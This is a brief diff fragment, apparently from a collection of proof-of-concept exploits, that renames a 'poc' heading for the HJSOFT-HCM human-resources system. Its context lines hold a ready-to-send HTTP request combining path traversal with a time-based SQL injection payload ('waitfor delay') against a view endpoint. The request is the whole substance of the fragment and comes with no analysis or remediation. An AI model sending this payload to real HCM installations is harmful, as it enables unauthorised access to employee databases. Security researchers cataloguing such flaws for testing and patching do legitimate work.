@@ -6,7 +6,7 @@ app="HJSOFT-HCM"
 ```
 
 
-## poc
+## POC
 ```
 GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:3'+-- HTTP/1.1
 Host: 127.0.0.1
